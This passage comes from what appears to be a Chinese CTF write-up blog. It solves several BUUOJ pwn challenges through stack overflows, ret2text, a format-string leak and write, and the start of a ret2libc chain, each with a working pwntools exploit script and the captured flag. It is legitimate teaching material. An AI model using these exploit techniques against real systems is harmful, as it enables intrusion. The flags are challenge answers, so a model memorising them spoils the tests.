class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun函数可能是自己写的，进去看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun函数是后门函数，只需要将程序执行流劫持到fun函数即可。<br>main函数中gets函数是危险函数，可以发生栈溢出，可以覆盖返回地址，从而劫持程序流。<br>使用pwndbg分析，可以得到s的起始地址与栈底(rbp)的距离为15个字节（当时一直以为会是8的整数倍，卡了好久）<br>而rbp距离函数的返回地址间有8字节，用于存放父函数rbp的地址。<br>只需要填充15 + 8字节的垃圾数据，再填上fun函数的地址即可。<br>发送即可拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29236</span>)</span><br><span class="line"><span class="comment"># a = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span>+<span class="number">0x8</span>) + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;e9332920-7605-4cbc-a337-3d75d42eb052&#125;</code><br>exp中后面函数地址加1的原因是为了保持16字节对齐，在64位指令中存在movaps指令，需要传入的参数16字节对齐，否则会抛出异常。这是一个比较坑的地方。<br><a href="https://iamvegetable2.github.io/2022/07/some-problems-about-movaps/">详细原因请见</a></p><h2 id="warmup-csaw-2016">warmup_csaw_2016</h2><p>很简单的栈溢出。<br>checksec一下，再使用IDA分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40060D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_40060D为后门函数，可以直接拿到flag。<br>main函数中gets(v5)语句存在栈溢出，通过动态调试，我们可以计算得输入数据的地址与rbp的差值为0x40字节，故需要0x48字节的填充数据，再填充上我们sub_40060D的地址即可。<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27568</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)  + p64(<span class="number">0x40060D</span>) </span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*(0x40+0x8) + p64(0x4006a4) + p64(0x40060D) </span></span><br><span class="line"><span class="comment"># 看有一些wp这样写，这个中间填充的数据为ret gadget，主要作用可能是维护堆栈平衡？但事实上上面的payload就可以拿到flag了</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>可以直接得到flag<code>flag&#123;722bdaf7-e159-44da-a466-dc4121ed6adc&#125;</code></p><h2 id="ciscn-2019-n-1">ciscn_2019_n_1</h2><p>checksec，64位，仅开启PIE。<br>main函数作用仅仅是设置缓冲区和调用func函数，直接看func函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当v2为11.28125时，调用system读取flag，我们只需要让v2的值为11.28125即可。<br>不过函数中并没有设置v2值的位置。gets函数读入的输入存入v1中，我们可以考虑使v1溢出，覆盖v2的位置，从而修改v2的值。<br>根据动态调试，v1的起始地址与rbp的差值为0x30字节，v2为0x4字节，则v1与v2中间的差值为(0x30-0x4)字节，v2处的值填充为11.28125的机器码即可。<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27229</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;eabfcf4c-f318-4354-ba3e-57202826b8ee&#125;</code></p><h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2><p>checksec，32位，仅开启NX。<br>是C++写成的程序，main函数没什么作用，直接看vuln函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑是将输入字符串中’I’替换位’you’，输入限定为32字节，根据动态分析需要60字节才能溢出。<br>所以我们输入21个’I’，再添加1个’a’，从而使得替换后字符串垃圾数据为64字节，再填入get_flag函数地址即可。（这道题出的比较巧妙，如果地址中有值被解码为I可能会被破坏。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29154</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">21</span> + <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x8048f0d</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>得flag<code>flag&#123;62b7c079-6ced-4a49-a877-d3bb54a3409e&#125;</code></p><h2 id="jarvisoj-level0">jarvisoj_level0</h2><p>checksec，64位，仅开启NX。<br>main函数调用vulnerable_function函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read函数可以读取0x200字节，而buf仅能存储128字节，会造成栈溢出，同时存在callsystem函数，可以直接拿shell。<br>动态调试得需要0x88的垃圾数据，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28453</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;66fab62a-9200-43e6-93d9-d74b41b3fe47&#125;</code></p><h2 id="第五空间2019-决赛-PWN5-1">[第五空间2019 决赛]PWN5 1</h2><p>checksec，32位，开启NX，Canary。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u); <span class="comment">// 开启Canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出可能没有什么太好的方法，毕竟有Canary，且静态分析时粗略估计，read函数的限定条件可能不足以使我们的字符串达到溢出的效果。看到<code>printf(buf)</code>可以考虑格式化字符串漏洞，直接读取0x804C044处字符串，从而获取随机生成的密码。<br>这样我们可以输入0x804C044的地址，再通过<code>%n$s</code>读取其中的内容。其中当我们调用<code>printf(buf)</code>时，我们输入的buf字符串的地址与esp的差值为0x28，可以被是为printf()的第11个参数（因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，再加上第一个参数为格式化字符串，则为printf函数的第(n + 1)个参数）。<code>%s</code>可以解析地址，并将地址值处存储的数据作为字符串来进行解析处理，这是我最初的思路。最终只需要让我们输入的密码与随机生成的密码相同即可拿到shell，这里因为有atoi函数，需要输入的是数字。</p><p><a href="https://iamvegetable2.github.io/2022/07/Format-String/">格式化字符串相关见</a></p><p>第一种方式就是上面的思路，泄露0x804C044处字符串，接收泄露的字符串后再将其发送。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25897</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804C044</span>) + <span class="string">b&#x27;%10$s&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello,&#x27;</span>)</span><br><span class="line">passwd =  r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">passwd = passwd[<span class="number">4</span>:]</span><br><span class="line">passwd = u32(passwd)</span><br><span class="line">passwd = <span class="built_in">str</span>(passwd)</span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">payload2 = flat([passwd])</span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>还有另一种方法是通过格式化字符串漏洞写入0x804C044，从而使得它的值为我们设定好的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%n表示不输出字符，但是把已经成功输出的可打印字符个数写入对应的整型指针参数所指的变量</span><br><span class="line">%k$n表示写入该格式化字符串对应的第n个参数，即printf函数的第(n + 1)个参数</span><br></pre></td></tr></table></figure><p>我们可以填充一段垃圾数据，这里我们设定垃圾数据长度为4字节，esp与我们字符串的地址差距与我们上面计算的相同，由于我们所要填充的地址值放在更低地址处，距离esp距离更远，所以k的值为2位十进制数。所以计算可得我们构造payload为AAAA + %16<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n%17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>n%18<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n%19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>n + p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3)（因为AAAA可以被视为第十个参数，前面垃圾数据加格式化字符串总共占据了24个字节，则第一个地址值可以视为第16个参数，之后以此类推。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25897</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">addr = <span class="number">0x804C044</span></span><br><span class="line">addr_w = p32(addr) + p32(addr+<span class="number">1</span>) + p32(addr+<span class="number">2</span>) + p32(addr+<span class="number">3</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;AAAA%16$n%17$n%18$n%19$n&#x27;</span> +addr_w</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;name:&#x27;</span>))</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>))</span><br><span class="line">payload2 = flat([<span class="built_in">str</span>(<span class="number">0x04040404</span>)])</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;fa16dae8-2cbf-43c2-8c5c-09ebc5b44087&#125;</code></p><h2 id="ciscn-2019-c-1">ciscn_2019_c_1</h2><p>一道非常离谱的题目，思路比较简单，栈溢出构造函数调用链，泄露got表项，即函数装载的地址，再根据这个值算出libc基址，从而调用system函数拿shell，只是一直跑不通 😭<br>倒也不是原理没搞清，主要是一直报莫名其妙的EOF，让人不能理解。<br>(后来发现多加了一个recvuntil()，我是** 😭)<br>checksec，64位，仅开启NX。<br>IDA分析，为动态链接函数，plt表中无system。main函数没有太大的作用，只是要求我们的输入是1时才能调用encrypt函数。begin函数仅仅打印几串字符串，也没有什么作用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; s[x] &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼看到gets函数，存在栈溢出。根据动态调试，需要填充88字节的垃圾数据，由于加密会对我们输入的字符串进行处理，所以我们需要使用\x00进行截断（貌似不截断也可以，不过截断以后更稳妥），即b’\x00’加87个字节的其他数据，从而绕过<code>v0&gt;=strlen(s)</code>的检验。<br>首先这个程序中无system函数和’/bin/sh’，同时程序中的gadget不足以支持我们构造系统调用，再加上ASLR肯定是开启的，libc基址是变化的，所以我们需要想办法泄露某个函数的真实地址，从而根据该函数的地址值算出system函数以及’/bin/sh’的地址值。<br>构造思路很简单。当encrypt函数执行完毕后，程序已经调用了gets, puts, getchar等函数，根据动态链接的装载规律，此时这些函数的got.plt表中已经填入了其真实地址。所以我们需要将程序got表中内容打印出来，所以我们选择输出函数puts。该程序为64位，所以我们需要寻找<code>pop rdi| ret</code>这个gadget，从而实现传参。<br>为了实现获取shell，我们需要运行两次main或encrypt函数，第一次是泄露地址，第二次是拿shell。所以为了实现多次执行，我们需要传入main函数或encrypt函数的地址。所以第一个payload我们可以构造为：b’\x00’+b’a’*87覆盖子函数栈空间和存放父函数ebp的位置，<code>pop 